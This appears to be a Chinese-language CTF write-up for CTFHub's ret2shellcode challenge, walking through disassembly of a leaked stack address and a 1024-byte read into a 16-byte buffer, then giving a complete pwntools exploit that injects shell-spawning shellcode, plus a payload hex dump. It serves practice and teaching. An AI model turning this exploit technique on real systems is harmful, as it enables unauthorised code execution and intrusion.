---
title: ret2shellcode 栈地址泄露与代码注入
date: 2026-05-09 20:44:00
categories:
  - pwn
tags:
  - 栈溢出
  - Shellcode
  - ret2shellcode
  - 地址泄露
  - 64位
---

> CTFHub ret2shellcode | 程序主动泄露栈地址，注入 Shellcode 获取 Shell

## 0x01 题目环境

| 项目 | 内容 |
|------|------|
| 题目类型 | 栈溢出 / ret2shellcode |
| 保护机制 | NX 关闭（栈上数据可执行） |
| 核心漏洞 | `read` 读取超长字节 + 程序主动泄漏栈地址 |

## 0x02 IDA 逆向分析

### 1. 栈空间分配

```asm
push    rbp
mov     rbp, rsp
sub     rsp, 10h            ; 开辟 0x10 (16字节) 栈空间
mov     [rbp+buf], 0
```

局部变量 `buf` 位于 `rbp - 0x10`。

### 2. 栈地址泄漏

```asm
lea     rdi, format     ; "What is it : [%p] ?\n"
call    _printf         ; 直接将 buf 的内存地址打印出来
```

程序使用 `%p` 格式化字符串打印 `buf` 地址，使我们可以无视 ASLR。

### 3. 栈溢出漏洞

```asm
lea     rax, [rbp+buf]
mov     edx, 400h       ; 最大读取 1024 字节
call    _read           ; 向仅 16 字节的 buf 写入 1024 字节
```

## 0x03 漏洞利用思路

**目标**：覆写 `main` 函数的返回地址，让程序执行 Shellcode。

**偏移计算**：
- `buf` 距离 `rbp`：`0x10` = 16 字节
- `Saved RBP`：8 字节
- **到达返回地址的填充长度 = 16 + 8 = 24 字节**

**Payload 布局**：`垃圾填充 + 返回地址 + Shellcode`

**Shellcode 地址计算**：
- 返回地址之前的填充 = 24 字节
- 返回地址本身 = 8 字节
- **Shellcode 起始地址 = 泄漏的 buf 地址 + 32 (0x20)**

## 0x04 Exploit 代码

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')

p = remote('challenge-86620ff89ceb10de.sandbox.ctfhub.com', 21770)

# 1. 提取泄露的栈地址
p.recvuntil(b"What is it : [")
leak_str = p.recvuntil(b"]", drop=True)
leak_addr = int(leak_str, 16)
log.success(f"Successfully leaked buf address: {hex(leak_addr)}")

# 2. 生成 Shellcode
shellcode = asm(shellcraft.sh())

# 3. 构造 Payload
padding = b'A' * 24
shellcode_addr = leak_addr + 32  # shellcode 放在返回地址之后

payload = padding + p64(shellcode_addr) + shellcode

# 4. 发送 Payload
p.sendlineafter(b"Input someting : \n", payload)
p.interactive()
```

## 0x05 Payload 字节流分析

```
00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000010  41 41 41 41  41 41 41 41  c0 b9 2c 6a  ff 7f 00 00  │AAAA│AAAA│··,j│····│
```

- **0x00 - 0x17**：`A` 填满 buf 和 Saved RBP
- **0x18 - 0x1F**：返回地址 `0x7fff6a2cb9c0`（小端序），指向后续 Shellcode

## 0x06 核心考点

- **ret2shellcode**：NX 关闭时，将返回地址指向栈上的 Shellcode
- **地址泄露**：程序主动打印栈地址，绕过 ASLR
- **偏移计算**：`buf(16) + saved_rbp(8) = 24` 字节到返回地址
- **Shellcode 定位**：`leak_addr + 24 + 8 = leak_addr + 32`
